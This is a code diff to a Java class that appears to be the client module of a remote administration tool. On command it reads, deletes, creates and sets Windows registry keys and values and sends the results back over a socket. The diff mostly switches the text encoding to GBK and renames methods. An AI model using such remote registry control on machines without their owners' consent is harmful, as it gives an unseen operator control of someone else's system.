@@ -8,16 +8,15 @@ import me.client.utils.MessageFlags;
 import me.client.utils.SendMessage;
 import oshi.jna.platform.windows.WinNT;
 
+import java.io.UnsupportedEncodingException;
 import java.net.Socket;
-import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
 
 public class RegisterManager {
     Socket socket;
     public RegisterManager(Socket socket) {
         this.socket = socket;
     }
-    public void regQuery(int hkey, String keyString) {
+    public void regQuery(int hkey, String keyString) throws UnsupportedEncodingException {
         char[] string = new char[WinNT.MAX_PATH];
         byte[] bytes = new byte[1024];
         String str = null;
@@ -34,7 +33,7 @@ public class RegisterManager {
             intByReference = new IntByReference(WinNT.MAX_PATH);
             String temp = new String(string);
             str = temp.substring(0, temp.indexOf("\0"));
-            SendMessage.Send(MessageFlags.REGIDTER_QUERY_KEY, str.getBytes( ), socket);
+            SendMessage.send(MessageFlags.REGIDTER_QUERY_KEY, str.getBytes( "GBK"), socket);
         }
         while (Advapi32.INSTANCE.RegEnumValue(hkeyByReference.getValue(), value1++, string, intByReference, null, intByReference1, bytes, intByReference2) != com.sun.jna.platform.win32.WinNT.ERROR_NO_MORE_ITEMS) {
             intByReference2 = new IntByReference(100);
@@ -44,7 +43,7 @@ public class RegisterManager {
             String type = getType(intByReference1.getValue());
             Object values = getValue(hkey, keyString, str);
             String strings = str + "|" + type + "|" + values;
-            SendMessage.Send(MessageFlags.REGIDTER_QUERY_VALUE,strings.getBytes( ),socket);
+            SendMessage.send(MessageFlags.REGIDTER_QUERY_VALUE,strings.getBytes("GBK"),socket);
         }
         Advapi32.INSTANCE.RegCloseKey(hkeyByReference.getValue());
     }
@@ -52,16 +51,16 @@ public class RegisterManager {
         Object obj = Advapi32Util.registryGetValue(new WinReg.HKEY(hkey),path,value);
         return obj;
     }
-    public void deleteValue(int hkey,String path,String value) {
+    public void deleteValue(int hkey,String path,String value) throws UnsupportedEncodingException {
         Advapi32Util.registryDeleteValue(new WinReg.HKEY(hkey),path,value);
         regQuery(hkey,path);
     }
-    public void deleteKey(int hkey,String path) {
+    public void deleteKey(int hkey,String path) throws UnsupportedEncodingException {
         Advapi32Util.registryDeleteKey(new WinReg.HKEY(hkey),path);
         String lastPath = path.substring(0,path.lastIndexOf("\\"));
         regQuery(hkey,lastPath);
     }
-    public void createValue(int hkey,String path,String newValue,String type) {
+    public void createValue(int hkey,String path,String newValue,String type) throws UnsupportedEncodingException {
         switch (type) {
             case "REG_DWORD":
                 Advapi32Util.registrySetLongValue(new WinReg.HKEY(hkey),path, newValue,0);
@@ -75,14 +74,14 @@ public class RegisterManager {
         }
         regQuery(hkey,path);
     }
-    public void createKey(int hkey,String path,String newKey) {
+    public void createKey(int hkey,String path,String newKey) throws UnsupportedEncodingException {
         Advapi32Util.registryCreateKey(new WinReg.HKEY(hkey),path,newKey);
         regQuery(hkey,path);
     }
-    public void setValue(int hkey,String path,String value,String setValue,String type) {
+    public void setValue(int hkey,String path,String value,String setValue,String type) throws UnsupportedEncodingException {
         switch (type) {
             case "REG_BINARY":
-                SendMessage.SendHead(MessageFlags.REGIDTER_ERROR,socket);
+                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                 break;
             case "REG_DWORD":
                 Advapi32Util.registrySetLongValue(new WinReg.HKEY(hkey),path,value,Integer.parseInt(setValue));
@@ -91,16 +90,16 @@ public class RegisterManager {
                 Advapi32Util.registrySetExpandableStringValue(new WinReg.HKEY(hkey),path,value,setValue);
                 break;
             case "REG_LINK":
-                SendMessage.SendHead(MessageFlags.REGIDTER_ERROR,socket);
+                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                 break;
             case "REG_SZ":
                 Advapi32Util.registrySetStringValue(new WinReg.HKEY(hkey),path,value,setValue);
                 break;
             case "REG_MULTI_SZ":
-                SendMessage.SendHead(MessageFlags.REGIDTER_ERROR,socket);
+                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                 break;
             case "REG_NONE":
-                SendMessage.SendHead(MessageFlags.REGIDTER_ERROR,socket);
+                SendMessage.sendHead(MessageFlags.REGIDTER_ERROR,socket);
                 break;
         }
         regQuery(hkey,path);
